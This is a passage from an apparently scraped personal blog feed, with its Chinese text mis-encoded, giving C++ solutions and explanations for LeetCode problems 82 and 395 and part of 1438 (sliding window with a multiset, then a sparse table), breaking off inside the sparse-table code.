åŒºé—´ä¸­ï¼Œæˆ‘ä»¬åœ¨ç¬¬ä¸€æ¬¡éå†çš„è¿‡ç¨‹ä¸­è®°å½•æ¯ä¸ªæ•°å€¼å‡ºç°çš„æ¬¡æ•°ï¼Œè€Œåœ¨ç¬¬äºŒæ¬¡éå†è¿‡ç¨‹ä¸­è€ƒè™‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆçš„æ•°å€¼ï¼‰æ˜¯å¦åº”è¯¥å­˜åœ¨äºæœ€ç»ˆçš„ç»“æœä¸­å³å¯ã€‚\nå½“ç„¶ï¼Œä¸¤æ¬¡éå†çš„åŠæ³•éšç€èŠ‚ç‚¹æ•°æ®èŒƒå›´çš„å˜å¤§å¾ˆå¿«å°±å¤±æ•ˆäº†ï¼ŒæŠ•æœºä¸å¯å–ï¼Œä¸€æ¬¡éå†çš„åŠæ³•å¦‚ä½•å®ç°å‘¢ï¼Ÿ\nåœ¨æœ‰åºçš„æ•°ç»„ä¸­å–å¾—ä¸€æ®µç›¸åŒå…ƒç´ çš„å­æ•°ç»„ï¼Œç›´æ¥è€ƒè™‘æ»‘åŠ¨çª—å£ã€‚\næˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘çª—å£ å·¦è¾¹ç•Œçš„å·¦é‚»å±… ï¼Œä½¿ç”¨ä¸¤ä¸ªæŒ‡é’ˆç»´æŠ¤çª—å£çš„å·¦å³è¾¹ç•Œã€‚å½“çª—å£å³è¾¹ç•Œæ•°å€¼ç­‰äºå·¦è¾¹ç•Œæ•°å€¼æ—¶ï¼Œçª—å£å‘å³æ‰©å¼ ï¼Œå¦åˆ™è¿›è¡Œä¸€å®šçš„æ›´æ–°æ“ä½œã€‚\nå®¹æ˜“æƒ³è±¡ï¼Œåœ¨ä¸å‘ç”Ÿé‡å¤çš„æƒ…å†µä¸‹ï¼Œçª—å£çš„å¤§å°ï¼ˆright - leftï¼‰å§‹ç»ˆä¸º 1 ï¼Œè€Œå‘ç”Ÿé‡å¤çš„æ—¶å€™æ•´æ®µçª—å£éœ€è¦å…¨éƒ¨ä»é“¾è¡¨ä¸Šåˆ é™¤ã€‚\nçª—å£ä¸­æ— é‡å¤ çª—å£ä¸­æœ‰é‡å¤ éœ€è¦æ³¨æ„ï¼Œç”±äºæˆ‘ä»¬çš„è§„åˆ™æ˜¯ï¼šrightæŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ ä¸ left æŒ‡å‘çš„å…ƒç´ ä¸åŒæ—¶ï¼Œæ‰åœæ­¢çª—å£çš„æ‰©å¼ ï¼Œè¿›å…¥æ›´æ–°æ“ä½œï¼Œå› æ­¤ï¼Œright æŒ‡é’ˆæŒ‡å‘çš„å…ƒç´ å¹¶ä¸å±äºçª—å£æœ¬èº«ã€‚\né‚£ä¹ˆå¦‚ä½•æ›´æ–°å‘¢ï¼Ÿ\næˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå½“ right == left-\u0026gt;next æ—¶ï¼Œå³ winSize == 1 æ—¶ï¼Œä¸éœ€è¦å¯¹çª—å£ä¸­çš„å…ƒç´ è¿›è¡Œæ“ä½œï¼Œåˆ™å°†ä¸‰ä¸ªæŒ‡é’ˆå¾€åç§»åŠ¨ï¼Œç›´æ¥è¿›å…¥ä¸‹ä¸€æ­¥çš„çª—å£æ›´æ–°ç¯èŠ‚å³å¯ã€‚\nçª—å£å¤§å°ä¸º1æ—¶çš„æ›´æ–°åŠæ³• è€Œçª—å£å¤§å°å¤§äº1æ—¶ï¼Œå°±æ¯”è¾ƒæœ‰è¶£äº†ã€‚æˆ‘ä»¬ç›´æ¥å°†çª—å£ å·¦è¾¹ç•Œçš„å·¦é‚»å±… ï¼Œå³æ­¤å¤„çš„ Out-left æŒ‡å‘çš„å…ƒç´ é“¾å‘ right å…ƒç´ ï¼Œè¿™æ ·å°±ç›´æ¥è·³è¿‡äº†æ•´ä¸ªé‡å¤çš„éƒ¨åˆ†ï¼Œç¤ºæ„å¦‚ä¸‹ï¼š\nçª—å£å¤§å°ä¸ä¸º1æ—¶çš„æ›´æ–°åŠæ³• åˆ°ç°åœ¨ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»å®Œæˆäº†åœ¨æ­£å¸¸æƒ…å†µä¸‹çš„éå†æ›´æ–°ç­–ç•¥ï¼Œä½†æ˜¯å¾ªç¯éå†çš„è¾¹ç•Œæ¡ä»¶å¾ˆé‡è¦ï¼Œä¸”é¢˜ç›®è¦æ±‚è¿”å›ç»“æœé“¾è¡¨çš„å¤´ç»“ç‚¹ï¼Œè¿™ä¸ªå¤´ç»“ç‚¹è¯¥å¦‚ä½•ç¡®å®šä¹Ÿå¾ˆé‡è¦ã€‚\né¦–å…ˆæ˜¯å¾ªç¯æ¡ä»¶ï¼Œæˆ‘ä»¬ä½¿å¾— right æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªèŠ‚ç‚¹æ—¶ç»“æŸå¾ªç¯ï¼Œå› æ­¤ while (right-\u0026gt;next) ã€‚\nåœ¨æˆ‘çš„é¦–æ¬¡æäº¤ä¸­ï¼Œä½¿ç”¨äº†æ¯”è¾ƒå¤æ‚çš„é€»è¾‘æ¥åˆ¤æ–­å¤´ç»“ç‚¹æ˜¯å¦å·²ç»å‡ºç°ã€‚å½“ç¬¦åˆæ¡ä»¶çš„å¤´ç»“ç‚¹è¿˜æ²¡æœ‰å‡ºç°æ—¶ï¼Œå¯¹äºå½“å‰çš„ right æŒ‡é’ˆï¼Œå½“å®ƒçš„å³é‚»å±…å€¼ä¸å®ƒä¸åŒï¼Œåˆ™è¯´æ˜å½“å‰è¿™ä¸ª right æŒ‡å‘çš„èŠ‚ç‚¹æ˜¯ä¸ç”¨åˆ é™¤çš„ï¼Œå¯ä»¥ä½œä¸ºç»“æœé“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚\nåŒç†è¿›è¡Œ Out-left æŒ‡é’ˆçš„åˆ¤æ–­ã€‚\nACä»£ç 1 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* lefleft = NULL; ListNode* left = head; ListNode* right = head; ListNode* ret = NULL; int winSize = 1; while (right-\u0026gt;next) { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl; right = right-\u0026gt;next; if (right-\u0026gt;val == left-\u0026gt;val) { winSize++; } else { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl; if (winSize != 1) // delete the window { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl; if (!lefleft) // do not have previous node { if (!right-\u0026gt;next || right-\u0026gt;val != right-\u0026gt;next-\u0026gt;val) { ret = right; lefleft = right; } } else { lefleft-\u0026gt;next = right; } left = right; winSize = 1; } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } } } // right points to the last node if (winSize != 1) // delete the window { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl; if (lefleft) { lefleft-\u0026gt;next = NULL; } } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } return ret; } }; Performance1 åˆ†æ2 ä¸Šé¢çš„ä»£ç æ˜¾ç„¶ç”±äºå¼•å…¥äº†å¤´ç»“ç‚¹çš„é€»è¾‘è€Œå˜å¾—éå¸¸è‡ƒè‚¿ï¼Œèƒ½å¦å¯¹å…¶è¿›è¡Œä¼˜åŒ–å‘¢ï¼Ÿ\næˆ‘ä»¬å¼•å…¥ä¸€ä¸ªå“‘ç»“ç‚¹ dummy ï¼Œå®ƒä½œä¸ºå¤´ç»“ç‚¹ä¹‹å‰çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œåˆå§‹åŒ–ä¸º dummy-\u0026gt;next = headã€‚\næ­¤å¤–ï¼Œæ»‘åŠ¨çª—å£çš„æ€æƒ³å®é™…ä¸Šåœ¨æ­¤è¿‡äºå¤æ‚ï¼Œå› ä¸ºæˆ‘ä»¬åªéœ€è¦åˆ¤æ–­çª—å£çš„å¤§å°æ˜¯å¦ä¸º1ï¼Œåˆ™åªéœ€è¦è€ƒè™‘ right æ˜¯å¦ç­‰äº left-\u0026gt;next å³å¯ã€‚\näºæ˜¯ä¸€ç§è¾ƒä¸ºç®€æ´çš„æ€æƒ³è¯ç”Ÿäº†ï¼šä½¿ç”¨ pre ã€ now ã€ nxt ä¸‰ä¸ªæŒ‡é’ˆæ¥æ ‡è¯†å‰ä¸€ä¸ªèŠ‚ç‚¹ã€ç°åœ¨çš„èŠ‚ç‚¹å’Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹ã€‚è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„åŠæ³•å¯¹ now ï¼ˆå³ä¹‹å‰çš„ left ï¼‰å’Œ nxt ï¼ˆå³ä¹‹å‰çš„ right ï¼‰è¿›è¡Œæ›´æ–°ã€‚ç”±äº pre è¢«åˆå§‹åŒ–ä¸º dummy èŠ‚ç‚¹ï¼Œæ•…ä¸€è½®éå†ä¹‹åï¼Œdummy-\u0026gt;next æ‰€æŒ‡å‘çš„èŠ‚ç‚¹ä¸€å®šæ˜¯ç¬¬ä¸€æ¬¡ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹ï¼Œä¸ºè¿”å›çš„é“¾è¡¨å¤´éƒ¨ã€‚\nACä»£ç 2 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* dummy = new ListNode(0); dummy-\u0026gt;next = head; ListNode* pre = dummy; ListNode* now = head; ListNode* nxt = head-\u0026gt;next; while (nxt) { if (nxt-\u0026gt;val == now-\u0026gt;val) { nxt = nxt-\u0026gt;next; } else { if (nxt == now-\u0026gt;next) { pre = now; now = nxt; nxt = nxt-\u0026gt;next; } else { pre-\u0026gt;next = nxt; now = nxt; nxt = nxt-\u0026gt;next; } } } // æ³¨æ„æ­¤å¤„ç»†èŠ‚ï¼Œå¾ªç¯ç»“æŸä¹‹åè¿›è¡Œæœ€åä¸€æ¬¡åˆ¤æ–­ if (nxt != now-\u0026gt;next) { pre-\u0026gt;next = NULL; } return dummy-\u0026gt;next; } }; Performance2 å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.åˆ é™¤æ’åºé“¾è¡¨ä¸­çš„é‡å¤å…ƒç´  II[EB/OL].2021-03-24\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/solution/shan-chu-pai-xu-lian-biao-zhong-de-zhong-oayn/\n","date":"2021-03-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode82.-%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii/","title":"éš¾é¢˜æœ¬ | LeetCode82. åˆ é™¤æ’åºé“¾è¡¨ä¸­çš„é‡å¤å…ƒç´  II"},{"content":"é¢˜ç›®é“¾æ¥ï¼š https://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/\né¢˜ç›® ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸² s å’Œä¸€ä¸ªæ•´æ•° k ï¼Œè¯·ä½ æ‰¾å‡º s ä¸­çš„æœ€é•¿å­ä¸²ï¼Œ è¦æ±‚è¯¥å­ä¸²ä¸­çš„æ¯ä¸€å­—ç¬¦å‡ºç°æ¬¡æ•°éƒ½ä¸å°‘äº k ã€‚è¿”å›è¿™ä¸€å­ä¸²çš„é•¿åº¦ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š s = \u0026ldquo;aaabb\u0026rdquo;, k = 3\nè¾“å‡ºï¼š 3\nè§£é‡Šï¼š æœ€é•¿å­ä¸²ä¸ºâ€œaaaâ€ï¼Œå…¶ä¸­â€aâ€œé‡å¤äº†3æ¬¡\nç¤ºä¾‹2\nè¾“å…¥ï¼š s = â€œababbcâ€, k = 2\nè¾“å‡ºï¼š 5\næ•°æ®èŒƒå›´\n1 \u0026lt;= s.length \u0026lt;= 104 s ä»…ç”±å°å†™è‹±æ–‡å­—æ¯ç»„æˆ 1 \u0026lt;= k \u0026lt;= 105 åˆ†æ æ²¡æœ‰ä»»ä½•æ€è·¯ï¼Œå‚ç…§é¢˜è§£çš„åˆ†æ²»æ³•å°†æ­¤é¢˜è§£å‡ºï¼Œç¨ä½œè®°å½•ã€‚\né¦–å…ˆï¼Œå¯¹äº s ä¸­çš„æ‰€æœ‰å­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥ç»Ÿè®¡å®ƒä»¬å‡ºç°çš„æ¬¡æ•°ï¼Œå¯¹äºæ‰€æœ‰å‡ºç°æ¬¡æ•°å°äº k çš„å­—ç¬¦ï¼Œç­”æ¡ˆä¸­ä¸€å®šä¸åŒ…å«å®ƒã€‚\nåˆ™æˆ‘ä»¬åªéœ€è¦è€ƒè™‘è¿™äº›å­—ç¬¦ä¹‹å¤–çš„å­ä¸²ã€‚æˆ‘ä»¬å¯ä»¥éå†æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œå½“æŸä¸ªå­—ç¬¦å‡ºç°æ¬¡æ•°å°äº k çš„æ—¶å€™ï¼Œå°†å…¶ä½ç½®è®°å½•ä¸‹æ¥ï¼›æˆ‘ä»¬å‡­å€Ÿè¿™äº›ä½ç‚¹ï¼Œå¯ä»¥å°†åŸå­—ç¬¦ä¸² s åˆ†å‰²æˆè®¸å¤šä¸ªå­ä¸²ï¼Œç„¶åæŒ‰ç…§ç›¸åŒçš„åŠæ³•å»å¤„ç†è¿™äº›å­ä¸²å³å¯ã€‚\næŒ‰ç…§è¿™æ ·çš„åˆ†æï¼Œæ•´ä¸ªé¢˜ç›®å¯ä»¥ä½¿ç”¨é€’å½’çš„å†™æ³•æ¥å®ç°åˆ†æ²»ç®—æ³•ã€‚\nACä»£ç  class Solution { public: int longestSubstring(string s, int k) { if (s.size() \u0026lt; k) return 0; // ç»Ÿè®¡é¢‘æ•° vector\u0026lt;int\u0026gt; cnt(26, 0); for (auto ch : s) cnt[ch - \u0026#39;a\u0026#39;]++; // è®°å½•åˆ†å‰²ä½ç‚¹ vector\u0026lt;int\u0026gt; split; for (int i = 0; i \u0026lt; s.size(); i++) { if (cnt[s[i] - \u0026#39;a\u0026#39;] \u0026lt; k) { split.push_back(i); } } if (split.size() == 0) // æ— éœ€åˆ†å‰² return s.size(); int start = 0; // å½“å‰å­ä¸²çš„èµ·ç‚¹ int res = 0; // æœ€ç»ˆç­”æ¡ˆ for (auto pos : split) { // string.substr(pos, len) // ä»ä½ç½®poså¼€å§‹çš„è¿ç»­lenä¸ªå­—ç¬¦ res = max(res, longestSubstring(s.substr(start, pos - start), k)); start = pos + 1; } if (start != s.size() - 1) // å¯¹äºæœ€åä¸€ä¸ªå­ä¸² { res = max(res, longestSubstring(s.substr(start, s.size() - start), k)); } return res; } }; å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.è‡³å°‘æœ‰Kä¸ªé‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/zhi-shao-you-kge-zhong-fu-zi-fu-de-zui-c-o6ww/\n[2] è´Ÿé›ªæ˜çƒ›.å€Ÿæœ¬é¢˜å¸®åŠ©å¤§å®¶ç†è§£é€’å½’[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/jie-ben-ti-bang-zhu-da-jia-li-jie-di-gui-obla/\n[3] ffreturn.C++è¶…100%çš„åˆ†æ²»è§£æ³•[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/cchao-100de-fen-zhi-jie-fa-by-ffreturn-uygu/\n","date":"2021-02-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode395.-%E8%87%B3%E5%B0%91%E6%9C%89-k-%E4%B8%AA%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/","title":"éš¾é¢˜æœ¬ | LeetCode395. è‡³å°‘æœ‰ K ä¸ªé‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²"},{"content":"å®šåœºå¥ï¼šäººä¸€èƒ½ä¹‹ï¼Œå·±ç™¾ä¹‹ï¼›äººåèƒ½ä¹‹ï¼Œå·±åƒä¹‹ã€‚æœèƒ½æ­¤é“çŸ£ï¼Œè™½æ„šå¿…æ˜ï¼Œè™½æŸ”å¿…å¼ºã€‚\né¢˜ç›®é“¾æ¥ï¼šhttps://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/\né¢˜ç›® ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums ï¼Œå’Œä¸€ä¸ªè¡¨ç¤ºé™åˆ¶çš„æ•´æ•° limitï¼Œè¯·ä½ è¿”å›æœ€é•¿è¿ç»­å­æ•°ç»„çš„é•¿åº¦ï¼Œè¯¥å­æ•°ç»„ä¸­çš„ä»»æ„ä¸¤ä¸ªå…ƒç´ ä¹‹é—´çš„ç»å¯¹å·®å¿…é¡»å°äºæˆ–è€…ç­‰äº limit ã€‚\nå¦‚æœä¸å­˜åœ¨æ»¡è¶³æ¡ä»¶çš„å­æ•°ç»„ï¼Œåˆ™è¿”å› 0 ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š nums = [8,2,4,7], limit = 4\nè¾“å‡ºï¼š 2\nè§£é‡Šï¼š æ‰€æœ‰å­æ•°ç»„å¦‚ä¸‹ï¼š\n[8] æœ€å¤§ç»å¯¹å·® |8-8| = 0 \u0026lt;= 4.\n[8,2] æœ€å¤§ç»å¯¹å·® |8-2| = 6 \u0026gt; 4.\n[8,2,4] æœ€å¤§ç»å¯¹å·® |8-2| = 6 \u0026gt; 4.\n[8,2,4,7] æœ€å¤§ç»å¯¹å·® |8-2| = 6 \u0026gt; 4.\n[2] æœ€å¤§ç»å¯¹å·® |2-2| = 0 \u0026lt;= 4.\n[2,4] æœ€å¤§ç»å¯¹å·® |2-4| = 2 \u0026lt;= 4.\n[2,4,7] æœ€å¤§ç»å¯¹å·® |2-7| = 5 \u0026gt; 4.\n[4] æœ€å¤§ç»å¯¹å·® |4-4| = 0 \u0026lt;= 4.\n[4,7] æœ€å¤§ç»å¯¹å·® |4-7| = 3 \u0026lt;= 4.\n[7] æœ€å¤§ç»å¯¹å·® |7-7| = 0 \u0026lt;= 4.\nå› æ­¤ï¼Œæ»¡è¶³é¢˜æ„çš„æœ€é•¿å­æ•°ç»„çš„é•¿åº¦ä¸º 2 ã€‚\nç¤ºä¾‹2\nè¾“å…¥ï¼š nums = [10,1,2,4,7,2], limit = 5\nè¾“å‡ºï¼š 4\nåˆ†æ å®é™…ä¸Šè¿™é“é¢˜çš„æ€è·¯å¹¶ä¸éš¾ã€‚ä¸€å¥è¯ï¼šå­æ•°ç»„ä¸­ ä»»æ„ä¸¤ä¸ª å…ƒç´ ä¹‹é—´çš„ç»å¯¹å·®å°äºç­‰äº limit ç­‰ä»·äºå­æ•°ç»„ä¸­ æœ€å¤§æœ€å°å€¼ çš„ç»å¯¹å·®å°äºç­‰äº limitã€‚\nåˆ™åŸé—®é¢˜å°±è½¬åŒ–ä¸ºäº†æ±‚ åŒºé—´æœ€å€¼ çš„é—®é¢˜ï¼Œè¿™ç±»é—®é¢˜å¯ä»¥ä½¿ç”¨ çº¿æ®µæ ‘ æ¥è§£å†³ï¼Œä½†æ˜¯åœ¨è¿™é¢˜çš„æƒ…å¢ƒä¸‹å±äºæ€é¸¡ç”¨ç‰›åˆ€ï¼Œè€Œä¸”æˆ‘è¿˜ä¸ä¼šçº¿æ®µæ ‘ã€‚\nè€ƒè™‘STLä¸­çš„å„ç§æ•°æ®ç»“æ„ï¼Œæ˜¯å¦æœ‰ä¸€ç§æ•°æ®ç»“æ„èƒ½åœ¨çŸ­æ—¶é—´å†…å¾—åˆ°ä¸€ç»„æ•°æ®çš„æœ€å¤§æœ€å°å€¼å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ map/set/multimap/multisetã€‚\nå¯¹äºè¿™å››ç±»å®¹å™¨ï¼Œå…¶åº•å±‚å‡ä½¿ç”¨ çº¢é»‘æ ‘ æ¥è¿›è¡Œå®ç°ã€‚çº¢é»‘æ ‘æ˜¯ä¸€ç§æœ‰åºçš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬ä½¿ç”¨è¿™å››ç±»å®¹å™¨çš„è¿­ä»£å™¨è¿›è¡Œé¡ºåºéå†å°±èƒ½å¾—åˆ°å®¹å™¨ä¸­æ•°æ®çš„æœ‰åºçŠ¶æ€ã€‚\næˆ‘ä»¬åªå¸Œæœ›è·å¾—æœ€å¤§æœ€å°å€¼ï¼Œåˆ™ä¸å¿…è¿›è¡Œéå†ï¼Œåªéœ€è¦å–å®¹å™¨çš„é¦–å°¾å…ƒç´ å³å¯ï¼Œä½¿ç”¨å®¹å™¨è‡ªå¸¦çš„æˆå‘˜å‡½æ•°begin()å’Œrbegin()å°±èƒ½å®ç°ã€‚\nå¯¹äºè¿™é“é¢˜ï¼Œæ•°æ®å¯èƒ½é‡å¤ï¼Œæ•…æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªmultisetæ¥ä¿å­˜å½“å‰æ»‘åŠ¨çª—å£ä¸­çš„æ•°æ®ã€‚æ¯æ¬¡çª—å£å³è¾¹ç•Œå¢åŠ çš„æ—¶å€™ï¼ŒæŠŠæ–°æ¥çš„å…ƒç´ æ”¾å…¥é›†åˆä¸­ï¼Œç„¶ååˆ¤æ–­å½“å‰çª—å£æ˜¯å¦æ»¡è¶³æ¡ä»¶ï¼ˆæœ€å¤§ - æœ€å° \u0026gt; limitï¼‰ï¼Œè‹¥æ»¡è¶³ï¼Œæ›´æ–°æœ€å¤§çª—å£å€¼ï¼Œå¦åˆ™ç§»åŠ¨å·¦è¾¹ç•Œï¼ŒåŒæ—¶è¦æŠŠåŸæ¥å·¦è¾¹ç•Œä¸Šçš„å…ƒç´ ä»é›†åˆä¸­å»é™¤ã€‚\nè¿™é‡Œåªæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š\nä½¿ç”¨s.begin()å’Œs.rbegin()è·å¾—å½“å‰çª—å£çš„æœ€å€¼ï¼› ä½¿ç”¨s.erase(s.find(nums[left]))æ‰èƒ½åˆ é™¤å·¦è¾¹ç•Œå…ƒç´ è€Œä¸åˆ é™¤å…¶ä»–åŒæ•°å€¼çš„å…ƒç´ ã€‚ ACä»£ç 1 class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { multiset\u0026lt;int\u0026gt; s; int left = 0; int right = 0; int maxLen = 0; while (right \u0026lt; nums.size()) { s.insert(nums[right]); // cout \u0026lt;\u0026lt; *s.rbegin() \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; *s.begin() \u0026lt;\u0026lt; endl; while (*s.rbegin() - *s.begin() \u0026gt; limit) { s.erase(s.find(nums[left])); left++; } // cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; \u0026#34; ~ \u0026#34; \u0026lt;\u0026lt; left \u0026lt;\u0026lt; endl; maxLen = max(maxLen, right - left + 1); right++; } return maxLen; } }; Performance1 STè¡¨ ä¸Šé¢çš„è§£æ³•ç®€ç›´æ— æ³•ä»¤äººæ»¡è¶³å•Šï¼Œä¸€ä¸ªé‚£ä¹ˆé«˜ç«¯çš„åŒºé—´æœ€å€¼é—®é¢˜å°±ç®€å•åœ°ç”¨STLåº•å±‚çº¢é»‘æ ‘åšå‡ºæ¥äº†ï¼Ÿï¼Ÿ\næœç´¢å¼•æ“å¯åŠ¨ï¼Œæœä¸å…¶ç„¶ï¼Œæ—©å°±æœ‰ç»å…¸çš„æ±‚è§£åŒºé—´æœ€å€¼çš„ç®—æ³•äº†ã€‚\nSTè¡¨ï¼ˆSparse Tableï¼‰æ˜¯ç”¨äºè§£å†³RMQï¼ˆRange Maximum/Minimum Queryï¼‰çš„ç»å…¸ç®—æ³•ï¼Œå®ƒçš„ä¸»è¦æ€æƒ³æ˜¯å°†ä¸€ä¸ªåŒºé—´çš„æœ€å€¼è½¬åŒ–ä¸ºä¸¤æ®µå­åŒºé—´çš„æœ€å€¼ã€‚å®ƒçš„æ•°æ®ç»“æ„éå¸¸ç‰¹åˆ«ï¼ˆåœ¨æˆ‘çœ‹æ¥ï¼‰ï¼Œä½¿ç”¨ table[i][j] æ¥è¡¨ç¤ºä» nums[i] å¼€å§‹ï¼Œè¿ç»­ 2^j ä¸ªå…ƒç´ çš„æœ€å€¼ã€‚\næ–‡å­—çš„è¡¨ç°åŠ›ä¸å¤Ÿï¼Œæˆ‘ä»¬çœ‹ä¸‹å›¾æ‰€ç¤ºçš„é•¿åº¦ä¸º 8 çš„æ•°ç»„ï¼š\nArray æŒ‰ç…§ä¸Šè¿°çš„è§„åˆ™ï¼Œtable[0][2]å°±è¡¨ç¤ºä»nums[0]å¼€å§‹ï¼Œè¿ç»­2^2 = 4ä¸ªå…ƒç´ çš„æœ€å€¼ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€æ®µçš„æœ€å€¼ï¼š\n0 ~ 3 åŒç†ï¼Œtable[4][2]å°±è¡¨ç¤ºä»nums[4]å¼€å§‹ï¼Œè¿ç»­4ä¸ªå…ƒç´ çš„æœ€å€¼ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€æ®µçš„æœ€å€¼ï¼š\n4 ~ 7 è€Œtable[0][3]å°±å¾ˆæœ‰æ„æ€äº†ï¼Œå®ƒè¡¨ç¤ºä»nums[0]å¼€å§‹ï¼Œè¿ç»­8ä¸ªå…ƒç´ çš„æœ€å€¼ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸€æ®µçš„æœ€å€¼ï¼š\n0 ~ 7 ä½ æ˜¯å¦å‘ç°äº†ä»€ä¹ˆï¼Ÿ\næˆ‘ä»¬æ¬²æ±‚table[0][3]ï¼Œè€Œå®ƒå¯ä»¥ç”±table[0][2]å’Œtable[4][2]è¿™ä¸¤æ®µçš„æœ€å€¼å¾—åˆ°ï¼š\næœ€å€¼å…³ç³» ä»¥æ±‚æœ€å¤§å€¼ä¸ºä¾‹ï¼Œä¸å¤±ä¸€èˆ¬æ€§åœ°æœ‰ï¼š\ntable[i][j] = max(table[i][j - 1], table[i + pow(2, j - 1)][j - 1])\nçœ‹ä¼¼å¾ˆé•¿ï¼Œå®é™…ä¸Šå°±æ˜¯å°†å¾…æ±‚åŒºé—´æ‹†åˆ†æˆä¸¤ä¸ªå­æ®µï¼Œé•¿åº¦éƒ½æ˜¯2 ^ (j - 1)ã€‚\næ ¹æ®æ­¤è¡¨è¾¾å¼æ¥å†™ä»£ç ï¼Œåªéœ€è¦åœ¨å¤–å±‚éå† j ï¼Œå†…å±‚éå† i å³å¯ã€‚è€ƒè™‘å‡ ä¸ªä¸´ç•Œæ¡ä»¶ï¼š\nå¤–å±‚çš„ j ä½¿å¾— 2 ^ j èƒ½å¤Ÿè¦†ç›–åˆ°æ•´ä¸ªæ•°ç»„ä¸ºæ­¢ï¼Œæ•…ä½¿ç”¨ceilå‡½æ•°å°†å¯¹æ•°å€¼å‘ä¸Šå–æ•´ï¼› å†…å±‚çš„ i ä½¿å¾—ä» i å¼€å§‹çš„ 2 ^ j ä¸ªå…ƒç´ éƒ½åœ¨æ•°ç»„å†…ï¼ˆä¸è¶Šç•Œï¼‰ï¼› åˆå§‹æƒ…å†µä¸‹ï¼Œtable[i][0]å°±æ˜¯æ•°ç»„å…ƒç´ æœ¬èº«ï¼ˆä»ä¸‹æ ‡ i å¼€å§‹ï¼Œæ€»å…± 1 ä¸ªå…ƒç´ ï¼‰ã€‚ æ„é€ STè¡¨å¦‚ä¸‹ï¼š\nclass STTable { int table_min[100010][20]; int table_max[100010][20]; int pow2[20]; public: STTable(vector\u0026lt;int\u0026gt;\u0026amp; init) { int idx; int len = init.size(); pow2[0] = 1; // ç”¨äºå¿«é€Ÿè®¡ç®— 2 ^ j,ä½¿ç”¨åº“å‡½æ•°äº¦å¯ for (idx = 1; idx \u0026lt; 20; idx++) pow2[idx] = pow2[idx - 1] * 2; for (idx = 0; idx \u0026lt; len; idx++) { table_max[idx][0] = table_min[idx][0] = init[idx]; } // æ„é€ STè¡¨ // ä»idxå¼€å§‹ï¼Œå…± 2^j ä¸ªå…ƒç´  // æ³¨æ„Cè¯­è¨€å‡½æ•°logçš„åº•æ•°æ˜¯eï¼Œä½¿ç”¨æ¢åº•å…¬å¼è®¡ç®—log2 for (int j = 1; j \u0026lt; ceil(log(len) / log(2)); j++) { for (idx = 0; idx + pow2[j] \u0026lt;= len; idx++) { table_max[idx][j] = max(table_max[idx][j - 1], 